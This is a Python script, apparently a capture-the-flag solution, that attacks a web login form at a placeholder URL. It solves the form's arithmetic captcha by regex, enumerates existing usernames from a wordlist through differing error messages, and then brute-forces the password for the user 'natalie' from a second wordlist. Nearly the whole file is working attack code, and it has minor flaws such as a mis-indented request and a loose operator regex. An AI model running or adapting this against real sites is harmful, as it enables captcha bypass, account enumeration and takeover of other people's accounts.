import requests 
import re 
def captcha_search(response_text): 
    solved_value = 0 
    match = re.search(r"[0-9]{1,3} [+-/*] [0-9]{1,3}" , response_text)
    vals = match.group(0).split(' ') 
    vals[0] = int(vals[0]) 
    vals[2] = int(vals[2]) 
    if vals[1] == '+': 
        solved_value = vals[0] + vals[2] 
    elif vals[1] == '-': 
        solved_value = vals[0] - vals[2] 
    elif vals[1] == '*': 
        solved_value = vals[0] * vals[2] 
    elif vals[1] == '/': 
        solved_value = vals[0] / vals[2] 
    return solved_value 

user_file = open('usernames.txt', 'r') 
password_file = open('passwords.txt', 'r') 
url = 'http://url_here/login' 
# # testing with a single username 
# data = {'username': 'ronny', 'password': 'placeholder'} # response = requests.post(url, data = data) # if not 'Error:' in response.text: 
# print('Username is: admin') 
# print(captcha_search(response.text)) 
# data = {'username': 'ronny', 
# 'password': 'placeholder', 
# 'captcha':captcha_search(response.text)} # # send new captcha request 
# response = requests.post(url, data = data) # print(response.text) 
# print('The user ' in response.text) 
# search for username first 
for user in user_file: 
# remove all white spaces 
    user = user.strip() 
    data = {'username': user, 
    'password': 'placeholder'} 
    # send request with username
    response = requests.post(url, data = data) 
    # if there is captcha, solve it 
    if('Invalid captcha' in response.text): 
        data = {'username': user, 
        'password': 'placeholder', 
        'captcha':captcha_search(response.text)} 
        # send new captcha request 
        response = requests.post(url, data = data) 
        if (not 'The user ' in response.text): 
            print('The user ' + user +' exists') 
# # testing with a single password 
# data = {'username': 'natalie', 'password': 'joe'} # response = requests.post(url, data = data) # if not 'Error:' in response.text: 
# print('Username is: admin') 
# print(captcha_search(response.text)) 
# data = {'username': 'natalie', 
# 'password': 'placeholder', 
# 'captcha':captcha_search(response.text)} # # send new captcha request 
# response = requests.post(url, data = data) # print(response.text) 
# print('Invalid password for user' in response.text) 
#brute force the passwords 
for password in password_file: 
    password = password.strip() 
    data = {'username': 'natalie', 
            'password': password,} 
    response = requests.post(url=url, data=data) 
    if('Invalid captcha' in response.text): 
        # if there is captcha, solve it 
        data = {'username': 'natalie', 
            'password': password,
            'captcha':captcha_search(response.text)} # send new captcha request 
    response = requests.post(url=url, data=data) 
    
    if not 'Invalid password for user ' in response.text: 
        print('The password is: ' + password)
